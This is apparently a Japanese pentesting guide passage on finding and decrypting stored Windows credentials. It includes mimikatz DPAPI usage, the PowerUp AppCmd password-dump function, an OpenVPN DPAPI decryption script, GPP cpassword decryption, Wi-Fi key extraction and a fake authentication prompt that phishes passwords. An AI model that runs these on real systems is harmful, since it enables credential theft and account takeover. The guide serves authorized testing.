**DPAPIでは、ユーザーのログインシークレットから派生した対称鍵を使って鍵を暗号化できます**。システム暗号化の場合は、システムのドメイン認証シークレットが使用されます。

DPAPIで暗号化されたユーザーRSA鍵は、`%APPDATA%\Microsoft\Protect\{SID}`ディレクトリに保存されます。ここで`{SID}`は、ユーザーの[Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)を表します。**同じファイル内にある、ユーザーの秘密鍵を保護するマスターキーとともに配置されたDPAPI鍵**は、通常64バイトのランダムデータで構成されます。（このディレクトリへのアクセスは制限されているため、CMDで`dir`コマンドを使って内容を一覧表示することはできませんが、PowerShellでは一覧表示できます。）

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

適切な引数（`/pvk` または `/rpc`）を指定して、**mimikatz module** `dpapi::masterkey` を使用すると復号できます。

**master password** で保護された **credentials files** は、通常次の場所にあります。

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

**mimikatz module** `dpapi::cred` と適切な `/masterkey` を使用して復号できます。\
（root 権限がある場合）`sekurlsa::dpapi` module を使用して、**メモリ**から多数の DPAPI **masterkeys**を**抽出**できます。


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials**は、暗号化された認証情報を手軽に保存する方法として、**スクリプト**や自動化タスクでよく使われます。認証情報は**DPAPI**で保護されており、通常、作成時と同じコンピューター上の同じユーザーでのみ復号できます。

エクスポートされた認証情報のファイル名や`.xml`のパスは任意です。スクリプトやファイルの一覧から該当ファイルが見つかった場合は、`C:\Users`にあると決めつけず、対象アカウントの実際のプロファイルディレクトリを特定してください：[Windowsではプロファイルを別の場所に配置できます](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory)。ファイルが読み取り可能でも、それは手掛かりにすぎません。[Windowsの`Export-Clixml`は、暗号化された認証情報をエクスポートしたユーザーとコンピューターに紐付けます](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml)。また、復元したアカウントが対象サービスで有効な権限を持つかどうかは、別途確認する必要があります。通常の列挙では、暗号化された値や平文の値を表示せず、まずパスとACLを確認してください。

ファイルに含まれるPS credentialsを**復号**するには、次のようにします:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### 保存済み RDP 接続

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\  
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\` にあります。

### 最近実行したコマンド

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **リモート デスクトップ資格情報マネージャー**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

**Mimikatz** の `dpapi::rdg` module を適切な `/masterkey` とともに使用して、**.rdg ファイルを復号**します\
Mimikatz の `sekurlsa::dpapi` module を使用すると、メモリから多数の DPAPI masterkey を**抽出**できます

**mRemoteNG は別の接続ストアを使用します。** `%APPDATA%\mRemoteNG` およびユーザーの Documents にある読み取り可能な XML を調べます。`config.xml` のような一般的な名前のファイルも対象です。XML ファイルを認証情報の手掛かりとみなす前に、接続スキーマと暗号化された `Password` 属性を特定してください。保存値は DPAPI/RDCMan のパスワードではありません。復元できるかどうかは、ファイルの暗号化設定とカスタム master password が使用されたかどうかによります。広範な列挙中に暗号化された値を出力するのは避けてください。

**Remote Desktop Plus のプロファイルエクスポート**も、ユーザーディレクトリや共有管理フォルダー内にある場合があります。レガシーな `profiles.xml` エクスポートには、`ProfileName`、`Password`、`Secure` 要素を含む `Data/Profile` エントリーがあります。空でない password 要素は認証情報の手掛かりとして扱い、値を出力したり、平文だと決めつけたりしないでください。[ベンダーの説明](https://www.donkz.nl/)によると、プロファイル保護は作成時のアカウントとコンピューターに紐づけることも、より制限の緩い設定にすることもできます。これを信頼する前に、ファイルの出所と復元条件を確認してください。

### Sticky Notes

Sticky Notes アプリにパスワードなどの情報を保存している人もいます。Microsoft のパッケージ版 Sticky Notes アプリでは、通常、ノートは `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` に保存されます。古いアプリや別のアプリでは、LevelDB など、ユーザープロファイル内の別の場所に保存されることがあります。SQLite ファイルが見つからないからといってノートが存在しないと判断する前に、インストールされているアプリとストレージ形式を特定してください。

Sticky Notes が SQLite write-ahead logging を使用している場合、`plum.sqlite` だけをコピーすると、最近コミットされたノートが含まれない可能性があります。データベースの整合性を保ったコピーとともに、対応する `plum.sqlite-wal` を保管し、利用可能であれば `plum.sqlite-shm` も含めてください。共有メモリインデックスは再構築できますが、WAL はデータベースの永続状態の一部です。[SQLite の WAL ドキュメント](https://www.sqlite.org/wal.html)を参照してください。アカウント名やパスワードを含むノートは、認証情報の手掛かりにすぎません。アカウント、許可されたアクセス、およびパスワードの使い回しは、それぞれ別途確認してください。暗号化された password-manager のレコードからより高い権限のログインを確認するには、実際の復号キーとアプリケーション固有の解釈も必要です。

### AppCmd.exe

**AppCmd.exe からパスワードを復元するには、Administrator であり、High Integrity level で実行する必要があります。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` ディレクトリにあります。\
このファイルが存在する場合、一部の**認証情報**が設定されており、**復元**できる可能性があります。

このコードは [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) から抽出されました：

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認します。\
インストーラーは **SYSTEM 権限で実行される**ため、多くが **DLL Sideloading に対して脆弱です（情報元:** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）。**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## ファイルとレジストリ（認証情報）

### サポートツールのレジストリに残る認証情報アーティファクト

一部の古いリモートサポート製品では、固定されたアプリケーションのレジストリキーに、パスワード関連の値名が残っています。たとえば、[ベンダーによるレジストリキーの説明](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988)によると、TeamViewer の `SecurityPasswordAES` は、バージョン 9 より前では設定済みの静的セッションパスワードを示していました。値名のマーカーは調査の手がかりにすぎません。その認証情報を評価する前に、インストール済みのバージョン、読み取り可能な値データ、その形式、現在の認証動作を確認してください。リモートサポートのパスワードから、より高い権限を持つ Windows アカウントへ移行するには、実際にパスワードが再利用されており、そのアカウントへのアクセスが許可されていることも必要です。通常の列挙出力に暗号文や復元したパスワードを含めないでください。

### シートが保護された共有スプレッドシート

読み取り可能な共有ブックにアカウント情報が含まれていると疑われる場合は、**ファイル暗号化**とワークシートの保護や非表示列を区別してください。[Microsoft の説明](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel)によると、ワークシートの保護は編集を制御するもので、セキュリティ機能ではありません。それだけではブックの内容が暗号化されているとは言えません。許可された関連ファイルのみを確認し、広範な列挙中に候補となる秘密情報を出力しないでください。読み取り可能な `.xlsx` のパス、保護されたシート、または非表示列だけでは、認証情報の存在も、いずれかのアカウントの権限が高いことも証明できません。実際のデータと現在のアカウント権限は、それぞれ別途確認してください。

### CI サーバーに残された変更パッチ

CI サーバーは、ビルド完了後も、送信されたソース変更をデータディレクトリに保持していることがあります。[TeamCity のドキュメント](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html)では、`system/changes` はリモート実行の変更を保存する場所とされています。データディレクトリは設定可能であり、必ずしも `ProgramData` の下にあるとは限りません。読み取り可能なパッチには、削除または追加された、認証情報ファイル、暗号化キー、あるいはその両方を使用するスクリプトへの参照が残っている可能性があります。たとえば、PowerShell の `ConvertTo-SecureString -Key` の処理には、暗号化文字列だけでなく AES キーも必要です。[Microsoft のドキュメント](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring)では、キーは別途指定すると説明されています。まずアクセス可能なパッチ名のみを確認し、その後、許可を得て関連する内容を調べてください。通常の列挙出力に秘密情報を含めないでください。パッチのパス、暗号化された値、またはキーへの参照だけでは、有効な認証情報や高い権限へのアクセスがあるとは証明できません。データディレクトリの ACL を制限し、ビルド変更に秘密情報を含めないでください。

### 独自のローカル管理者パスワードローテーション

自作のパスワードローテーターは、暗号化されたローカル管理者パスワードをローカルサービスに保存し、データストアの認証情報を読み取り可能な `.env` ファイルやアップデーターのバイナリと同じ場所に保持している場合があります。アップデーターのスケジュールされたタスク、アカウント、構成の ACL、リスナー、データストアの権限を合わせて確認してください。ループバックのみで待ち受けるデータストアも、有効な認証情報を持つローカルユーザーからは到達できますが、認証に成功しただけでは、関連レコードを読み取る権限があるとは限りません。暗号化シードやキー素材が暗号文のそばから取得できる場合は、その暗号化を信用する前に、正確な鍵導出方法を確認してください。公開されたシードから Go の [`math/rand`](https://pkg.go.dev/math/rand) を使って AES キーを決定論的に導出する方式は、そのパスワードの保護には不適切です。Go のドキュメントでも、このパッケージはセキュリティ上重要な乱数生成には不適切とされています。復元したパスワードを権限昇格経路とみなす前に、そのパスワードが現在も有効で、ローカル Administrators グループのアカウントに属することを確認してください。スケジュールされたタスク、`.env` のパス、暗号化されたデータだけでは、これらの条件は一切証明されません。通常の列挙出力にパスワードやキー素材を含めないでください。

管理対象のローカル管理者パスワードには [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) を使用してください。ディレクトリまたは Entra が管理する保存領域とアクセス制御は、独自のローカルデータストアとは異なります。同様に、[Elasticsearch のロール](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/)は、認証済みのデータストアユーザーが特定のインデックスを読み取れるかどうかを決定します。

### Java サーバープラグインのアーカイブと認証情報の再利用

一部の Java サーバープラグインは、サーバーの `plugins` ディレクトリに JAR アーカイブとして配布されます。読み取り可能なカスタムプラグインには、設定やバイトコードに埋め込まれたサービス認証情報が含まれている場合があります。許可を得た場合にのみアーカイブを確認し、復元した秘密情報を通常の列挙出力に含めないでください。プラグインのパスだけでは秘密情報の存在は証明できません。また、復元したサービスパスワードが高い権限につながるのは、より高い権限を持つアカウントでも有効な場合に限られます。関連ファイルの ACL を確認し、再利用された認証情報を別々の秘密情報に置き換えてください。ディレクトリ構成については [PaperMC のプラグインインストールガイド](https://docs.papermc.io/paper/adding-plugins/)を、アーカイブの内容については [Oracle の JAR ドキュメント](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html)を参照してください。

### Openfire の組み込みデータベース認証情報

組み込みデータベースを使用する Openfire のインストール環境では、`openfire.script` が `Openfire\embedded-db` の下に保存されている場合があります。現在のアカウントで読み取れる場合は、`OFUSER` レコードと `passwordKey` プロパティを合わせて確認してください。Openfire の[ユーザープロバイダードキュメント](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html)によると、パスワードは平文で保存することも、そのプロパティに保持されたキーで暗号化することもできます。復元したパスワードが権限昇格に関係するのは、より高い権限を持つ ID で現在も有効な場合に限られます。ファイル名だけでは、読み取りアクセスも認証情報の再利用も証明できません。このパスはインベントリ調査の手がかりです。通常の列挙出力にデータベースの内容や認証情報を含めないでください。

別の `Openfire\conf\openfire.xml` ファイルには、外部データベースを使用している場合でも、管理コンソールに設定されたポートとバインドインターフェイスが記載されていることがあります。Openfire の管理コンソールは通常ループバックにバインドされますが、リスナーが稼働していれば、ローカルアカウントからそのアドレスに接続できます。実際のリスナー、許可された管理者ロール、プラグインのアップロードポリシー、Openfire サービスの ID を合わせて確認してください。プラグインをインストールできる管理者は、サービスのコンテキストでプラグインコードを実行させられる場合があります。サービスが LocalSystem として実行されている場合、その権限は非常に高い可能性があります。一致するアカウントパスワードや読み取り可能な構成パスだけでは、管理コンソールへのアクセスやコード実行は証明できません。ベンダーの[インストールおよびプラグイン管理ガイド](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html)と[プラグインアップロード API プロパティ](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html)を参照してください。

### フォレンジック管理サーバーの構成

Velociraptor サーバーの構成ファイルは通常 `server.config.yaml` という名前で、内部 CA の `CA.private_key` を含む場合があります。権限の低いユーザーがこのキーを読み取れる場合、API クライアント証明書を発行できる可能性があります。それによって高い権限を得られるかどうかは、サーバーのユーザーロール、API への到達性、サーバーまたは対象エージェントが実行される ID によって異なります。クライアント構成には別の情報が含まれます。クライアント構成が見つかっても、サーバー CA へのアクセスがあるとは限りません。CA の秘密鍵をオフラインで保管している環境もあるため、読み取り可能なサーバー構成に署名キーが含まれていない場合もあります。

Windows サーバーでは、インストールディレクトリ内の**サーバー**構成と、保護されたバックアップの ACL を確認してください。場所の例は `%ProgramFiles%\VelociraptorServer\server.config.yaml` です。異なる場合は、サービスに設定されたパスを使用してください。現在の ID でファイルを読み取れることと、`CA.private_key` が実際に存在することを確認してください。ログや列挙出力に秘密鍵を出力しないでください。ベンダーの `config api_client` ワークフローは CA キーを使ってクライアント証明書を発行しますが、実効性のあるサーバー側ロールも必要です。ロールの作成や変更には、データストアへの書き込みアクセスまたは再起動が必要な場合があります。それらの書き込みができなくても、既存の特権サーバー ID が経路になることがあります。実行権限を持つ API クエリは、関連するサーバーまたはエージェントのコンテキストで実行され、非常に高い権限を持つ場合があります。

サーバー構成とバックアップを制限的な ACL で保護し、可能な場合は CA 署名キーをオフラインで保管し、API ロールとリスナーへのアクセスを制限してください。[Velociraptor API ドキュメント](https://docs.velociraptor.app/docs/server_automation/server_api/)と[セキュリティ構成のガイダンス](https://docs.velociraptor.app/docs/deployment/security/)を参照してください。

### Putty の認証情報

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTYは独立したセッションマネージャーです。ネイティブの暗号化ストアは `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat` にある場合があり、エクスポートしたセッションのバックアップは `sessions-backup.dat` という名前で別の場所に保存されている場合があります。[SolarWindsのエクスポートガイド](https://thwack.solarwinds.com/discussion/comment/115591)によると、エクスポートデータはパスワードで暗号化され、セッション、キー、スクリプト、タグ、関連付けが含まれることがあります。[サポートフォーラム](https://thwack.solarwinds.com/discussion/4520/saved-session-lost)では、ネイティブストアの場所が示されています。まずファイルのアクセス権とパスを確認してください。どちらかのファイルが見つかっても、パスワードが判明するわけでも、保存された認証情報が有効なままであることや、より高い権限を持つことが証明されるわけでもありません。

### Putty SSH ホストキー

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### レジストリ内の SSH keys

SSH private keys はレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` 内に保存されている場合があるため、興味深いものがないか確認してください。

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

そのパス内にエントリが見つかった場合、保存済みの SSH key である可能性が高いです。暗号化されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使えば簡単に復号できます。\
この technique の詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` service が実行されておらず、起動時に自動的に開始するには、次を実行します:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> この手法はもう有効ではないようです。ssh keysを作成し、`ssh-add`で追加してから、ssh経由でマシンにログインしてみました。レジストリのHKCU\Software\OpenSSH\Agent\Keysは存在せず、procmonでも非対称鍵認証中に`dpapi.dll`が使用されていることを確認できませんでした。

### 無人インストールファイル

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

これらのファイルは **metasploit** を使って検索することもできます: _post/windows/gather/enum_unattend_

例の内容:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM のバックアップ

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

読み取り可能な Windows Imaging（`.wim`）バックアップファイルには、オフラインの `SAM`、`SECURITY`、`SYSTEM` ハイブが含まれている場合もあります。まずローカルからアクセスできるバックアップディレクトリやイメージディレクトリを優先し、何かを抽出する前にイメージ内の**メンバー名**を確認してください。`.wim` というファイル名だけではハイブが露出している証拠にはなりません。また、通常の `install.wim`、`boot.wim`、リカバリーイメージは、誤検知につながるよくある候補です。SMB share は別のアクセス経路であり、その share が対象範囲に含まれる場合に限り確認してください。Microsoft の [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) および [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) を参照してください。

### クラウド認証情報

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml**という名前のファイルを検索します。

### キャッシュされたGPPパスワード

以前は、Group Policy Preferences（GPP）を使って、複数のマシンにカスタムのローカル管理者アカウントを展開できる機能がありました。しかし、この方法には重大なセキュリティ上の欠陥がありました。まず、SYSVOLにXMLファイルとして保存されているGroup Policy Object（GPO）は、すべてのドメインユーザーがアクセスできました。次に、公開されているデフォルトキーを使用してAES256で暗号化されたGPP内のパスワードは、認証済みユーザーなら誰でも復号できました。ユーザーが昇格した権限を得る可能性があるため、これは深刻なリスクでした。

このリスクを軽減するため、空ではない「cpassword」フィールドを含む、ローカルにキャッシュされたGPPファイルをスキャンする関数が開発されました。そのようなファイルが見つかると、関数はパスワードを復号し、カスタムのPowerShellオブジェクトを返します。このオブジェクトには、GPPとファイルの場所に関する詳細が含まれており、このセキュリティ上の脆弱性の特定と修正に役立ちます。

次のファイルを `C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista以前)_ で検索します。

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPasswordを復号するには:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

crackmapexecを使ってパスワードを取得する：

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

認証情報を含む web.config の例：

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot 内のバックアップアーカイブ

配信対象の webroot に古い ZIP バックアップが直接置かれていると、以前の設定ファイルや再利用可能な認証情報が漏えいする可能性があります。露出として扱う前に、サイトに設定された物理パスと、そのアーカイブが HTTP 経由で実際にアクセス可能かを確認してください。既定の `C:\inetpub\wwwroot` は候補の一つにすぎません。簡単なローカル調査では、アーカイブを開かずに名前とサイズを一覧表示できます。

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

アーカイブ名だけでは、秘密情報が含まれていることも、取得した認証情報によってより高い権限が得られることも証明できません。

### OpenVPNの認証情報

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### ログ

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### 認証情報を尋ねる

ユーザーが知っている可能性があると思う場合は、いつでも**ユーザー自身の認証情報、あるいは別のユーザーの認証情報を入力するよう求める**ことができます（ただし、クライアントに**認証情報**を直接**尋ねる**のは非常に**危険**です）：

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **認証情報を含む可能性のあるファイル名**

以前、**パスワード**を**平文**または**Base64**で含んでいた既知のファイル】【。

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 database では、一般的に `.psafe3` 拡張子が使われます。一致するファイル名は暗号化された vault の候補として扱ってください。ファイルが存在しても、読み取りやロック解除ができること、または保存された認証情報を使用できることの証明にはなりません。保存場所を確認する際は、アクセス可能なユーザープロファイルと、設定済みのファイル共有ルートを調べてください。

読み取り可能な KeePass `.kdbx` も、暗号化された vault の手がかりにすぎません。ロック解除には、実際の master password と、設定されている key-file やアカウント要素が必要です。承認されたレビューでエントリ内に LM:NT hash pair が見つかった場合は、[pass-the-hash](../ntlm/README.md#pass-the-hash) を検討する前に、記載されたアカウントと、NT hash が現在も有効で、対象の NTLM service に受け入れられることを確認してください。vault のエントリだけで Administrator または SYSTEM の権限が得られるわけではありません。リモートサービスへのアクセス、アカウント権限、および別途必要なサービス実行手順も満たされている必要があります。インベントリには vault のパスと読み取り可否を記録し、データベースや保存された認証情報は出力しないでください。

提案されたファイルをすべて検索します:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
